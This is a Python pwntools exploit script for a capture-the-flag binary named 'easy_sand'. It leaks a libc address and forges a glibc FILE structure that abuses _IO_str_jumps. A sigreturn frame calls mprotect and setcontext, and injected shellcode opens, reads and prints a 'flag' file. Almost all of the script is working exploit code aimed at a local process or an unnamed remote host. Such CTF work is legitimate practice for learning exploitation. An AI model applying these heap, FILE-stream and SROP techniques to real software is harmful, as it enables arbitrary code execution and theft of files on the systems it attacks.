# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './easy_sand'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    ru('0x')
    libc.address =  rint() - libc.sym['_IO_2_1_stderr_']
    stdin = libc.sym['_IO_2_1_stdin_']
    _IO_wide_data_0 = libc.address + 0x1eba60
    _IO_str_jumps = libc.address + 0x1ed560
    setcontext = libc.sym['setcontext'] + 61
    mprotect = libc.sym['mprotect']
    __malloc_hook = libc.sym['__malloc_hook']
    
    flag_addr = _IO_wide_data_0 + 0x100

    lg('libc.address' ,  libc.address)
    lg('stdin',stdin)

    se(p64(stdin))
    # _IO_flush_all_lockp
    # getkeyserv_handle
    # _IO_str_overflow
    # dbg('_IO_str_overflow')

    sig = SigreturnFrame()
    sig.rsp = __malloc_hook +0x8
    sig.rdi = _IO_wide_data_0 & 0xfffffffff000
    sig.rsi = 0x1000
    sig.rdx = 7
    sig.rip = mprotect

    read =shellcraft.read(0,'rsp',0x99)

    payload = pack_file(
        _flags = 0xfbad1800,
        _IO_write_ptr = _IO_wide_data_0
    )
    payload +=p64(_IO_str_jumps)
    payload +=str(sig)
    payload = payload.ljust( 0x1f0,'\x00')
    payload +=p64(setcontext)
    payload +=p64(__malloc_hook + 0x10)
    payload +=asm(read)

    orw_payload = shellcraft.open('flag',0,0)
    orw_payload +=shellcraft.read(3,libc.sym['__free_hook']+0x10,0x50)
    orw_payload +=shellcraft.write(1,libc.sym['__free_hook']+0x10,0x50)

    se(payload)
    se(asm(orw_payload).rjust(0x99 , '\x90'))

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   easy_sand.py
@Time    :   2022/07/01 15:30:31
@Author  :   Niyah 
'''